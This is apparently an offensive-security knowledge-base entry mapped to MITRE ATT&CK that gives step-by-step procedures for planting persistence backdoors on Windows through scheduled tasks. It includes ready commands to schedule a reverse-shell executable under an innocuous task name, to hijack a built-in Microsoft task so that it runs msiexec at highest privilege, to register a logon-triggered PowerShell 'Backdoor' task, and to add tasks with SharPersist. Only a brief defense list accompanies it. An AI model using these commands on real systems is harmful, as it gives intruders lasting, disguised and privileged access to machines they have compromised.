---
id: edf8b0ad-78a2-42c0-8c8d-d29f13461720
name: Scheduled Task Backdoor Creation
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:27.856724+00:00'
updated_at: '2023-04-10T20:37:30.419454+00:00'
tactics:
- '[[Execution|TA0002 - Execution]]'
- '[[Persistence|TA0003 - Persistence]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Scheduled Task|T1053 - Scheduled Task]]'
tags:
- '[[Scheduled Tasks User]]'
- '[[Simple User]]'
- '[[Windows - Persistence]]'
commands:
- '[[Add new task]]'
- '[[Add new task hourly]]'
- '[[Add to current scheduled task]]'
- '[[Create Scheduled Task]]'
- '[[Create Scheduled Task for Backdoor]]'
- '[[Create scheduled task to run revshell.exe at 00:00]]'
- '[[Force run the scheduled task]]'
- '[[Register Scheduled Task]]'
- '[[Set Scheduled Task Principal]]'
- '[[Set Scheduled Task Settings]]'
- '[[Set Scheduled Task Trigger]]'
---

# Scheduled Task Backdoor Creation

## Summary

The Scheduled Task Backdoor Creation procedure allows an attacker to establish persistence by creating a scheduled task that executes a backdoor. This can be achieved by using the 'Scheduled Task Creation' and 'Modify Scheduled Task to Execute an Executable' commands to create and modify a schedule

## Description

# Description

The Scheduled Task Backdoor Creation procedure allows an attacker to establish persistence by creating a scheduled task that executes a backdoor. This can be achieved by using the 'Scheduled Task Creation' and 'Modify Scheduled Task to Execute an Executable' commands to create and modify a scheduled task, respectively. By doing so, the attacker can ensure that the backdoor is executed at a specific time, such as during system startup or when a specific event occurs. This technique can be used to maintain access to a compromised system even after a reboot or other disruptions. From a technical standpoint, the attacker needs to have access to a user account with the necessary permissions to create and modify scheduled tasks. From a business perspective, this technique can enable attackers to maintain persistence and continue to exfiltrate data or carry out other malicious activities.

## Requirements

1. Access to a user account with permissions to create and modify scheduled tasks

## Defense

1. Regularly review and monitor scheduled tasks for any suspicious or unauthorized changes

1. Implement least privilege access controls to limit the ability of attackers to create and modify scheduled tasks

1. Use security tools such as endpoint detection and response (EDR) solutions to detect and respond to any attempts to create or modify scheduled tasks

## Objectives

1. Establish persistence on a compromised system

1. Ensure that a backdoor is executed at a specific time

# Instructions

1. To create a new scheduled task using the **schtasks** command, follow these steps:
1. Open a PowerShell window with administrative privileges.
2. Use the following command to create the scheduled task:
   `schtasks /create /sc <schedule_type> /st <start_time> /tn <task_name> /tr <task_path>`
   - Replace `<schedule_type>` with the desired schedule type (e.g. ONCE, DAILY, WEEKLY, etc).
   - Replace `<start_time>` with the desired start time in the format `HH:MM`.
   - Replace `<task_name>` with a name for the task.
   - Replace `<task_path>` with the path to the executable or script that the task should run.
3. Use the following command to force run the task:
   `schtasks /run /tn <task_name>`
   - Replace `<task_name>` with the name of the task you created in step 2.

**Code**: [[# Create the scheduled tasks to run once at 00.00
]]

> The **schtasks** command is used to schedule tasks to run at specified times. This command can be used to automate various tasks such as backups, system maintenance, and more. The `/create` option is used to create a new scheduled task, while the `/run` option is used to force run an existing task. The `/sc` option is used to specify the schedule type, and can be set to ONCE, DAILY, WEEKLY, etc. The `/st` option is used to specify the start time for the task, in the format `HH:MM`. The `/tn` option is used to specify a name for the task, and the `/tr` option is used to specify the path to the executable or script that the task should run.

**Command** ([[Create scheduled task to run revshell.exe at 00:00]]):

```bash
schtasks /create /sc ONCE /st 00:00 /tn "Device-Synchronize" /tr C:\Temp\revshell.exe
```

**Command** ([[Force run the scheduled task]]):

```bash
schtasks /run /tn "Device-Synchronize"
```

2. To modify an existing scheduled task to execute an executable using the `schtasks /change` command, follow the below steps:
1. Open Command Prompt as Administrator.
2. Run the command `schtasks /change /tn "\Microsoft\Windows\PLA\Server Manager Performance Monitor" /TR "C:\windows\system32\rundll32.exe SHELL32.DLL,ShellExec_RunDLLA C:\windows\system32\msiexec.exe /Z c:\programdata\S-1-5-18.dat" /RL HIGHEST /RU "" /ENABLE`.
3. Replace the scheduled task name (`\Microsoft\Windows\PLA\Server Manager Performance Monitor`) with the name of the task you want to modify.
4. Replace the path of the executable (`C:\windows\system32\msiexec.exe`) with the path of the executable you want to execute.
5. Press Enter to execute the command.

**Code**: [[# Launch an executable by calling the ShellExec_Ru]]

> The `schtasks /change` command is used to modify the properties of an existing scheduled task. The `/tn` parameter is used to specify the name of the task that you want to modify. The `/TR` parameter is used to specify the path of the executable that you want to execute. The `rundll32.exe SHELL32.DLL,ShellExec_RunDLLA` command is used to launch the executable using the ShellExec_RunDLL function. The `/RL` parameter is used to specify the privilege level of the task (in this case, `HIGHEST`). The `/RU` parameter is used to specify the user account that the task should run as. The `/ENABLE` parameter is used to enable the task after it has been modified.

3. To create a scheduled task backdoor using Powershell, follow these steps:
1. Open Powershell
2. Run the command: $A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\Users\Rasta\AppData\Local\Temp\backdoor.exe"
3. Run the command: $T = New-ScheduledTaskTrigger -AtLogOn -User "Rasta"
4. Run the command: $P = New-ScheduledTaskPrincipal "Rasta"
5. Run the command: $S = New-ScheduledTaskSettingsSet
6. Run the command: $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S
7. Run the command: Register-ScheduledTask Backdoor -InputObject $D

**Code**: [[PS C:\> $A = New-ScheduledTaskAction -Execute "cmd]]

> This command creates a scheduled task that runs a backdoor every time the user logs on. The scheduled task is created with the New-ScheduledTaskAction cmdlet, which specifies the action to take when the task is run. The New-ScheduledTaskTrigger cmdlet is used to specify when the task should run, in this case at logon. The New-ScheduledTaskPrincipal cmdlet is used to specify the user account that the task should run under. The New-ScheduledTaskSettingsSet cmdlet is used to specify the settings for the task, such as whether it should be run with the highest privileges. Finally, the New-ScheduledTask cmdlet is used to create the scheduled task object, which is then registered with the Register-ScheduledTask cmdlet.

**Command** ([[Create Scheduled Task for Backdoor]]):

```bash
$A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\Users\Rasta\AppData\Local\Temp\backdoor.exe"
```

**Command** ([[Set Scheduled Task Trigger]]):

```bash
$T = New-ScheduledTaskTrigger -AtLogOn -User "Rasta"
```

**Command** ([[Set Scheduled Task Principal]]):

```bash
$P = New-ScheduledTaskPrincipal "Rasta"
```

**Command** ([[Set Scheduled Task Settings]]):

```bash
$S = New-ScheduledTaskSettingsSet
```

**Command** ([[Create Scheduled Task]]):

```bash
$D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S
```

**Command** ([[Register Scheduled Task]]):

```bash
Register-ScheduledTask Backdoor -InputObject $D
```

4. To add or update a scheduled task using SharPersist, use the following commands:

- To add to a current scheduled task:
SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Something Cool" -m add

- To add a new task:
SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add
SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add -o hourly

**Code**: [[# Add to a current scheduled task
SharPersist -t s]]

> The above commands use SharPersist to add or update a scheduled task. The `schtaskbackdoor` and `schtask` options are used to specify the type of task to add or update. The `-c` option specifies the command to run, and the `-a` option specifies the arguments to pass to the command. The `-n` option specifies the name of the task, and the `-m` option specifies the mode of the task (either `add` or `update`). The `-o` option is used to specify the frequency of the task (e.g. `hourly`).

**Command** ([[Add to current scheduled task]]):

```bash
SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Something Cool" -m add
```

**Command** ([[Add new task]]):

```bash
SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add
```

**Command** ([[Add new task hourly]]):

```bash
SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add -o hourly
```

## MITRE ATT&CK Mapping

### Tactics

- [[Execution|TA0002 - Execution]]
- [[Persistence|TA0003 - Persistence]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Scheduled Task|T1053 - Scheduled Task]]

## Commands Used

- [[Add new task]]
- [[Add new task hourly]]
- [[Add to current scheduled task]]
- [[Create Scheduled Task]]
- [[Create Scheduled Task for Backdoor]]
- [[Create scheduled task to run revshell.exe at 00:00]]
- [[Force run the scheduled task]]
- [[Register Scheduled Task]]
- [[Set Scheduled Task Principal]]
- [[Set Scheduled Task Settings]]
- [[Set Scheduled Task Trigger]]

## Tags

- [[Scheduled Tasks User]]
- [[Simple User]]
- [[Windows - Persistence]]
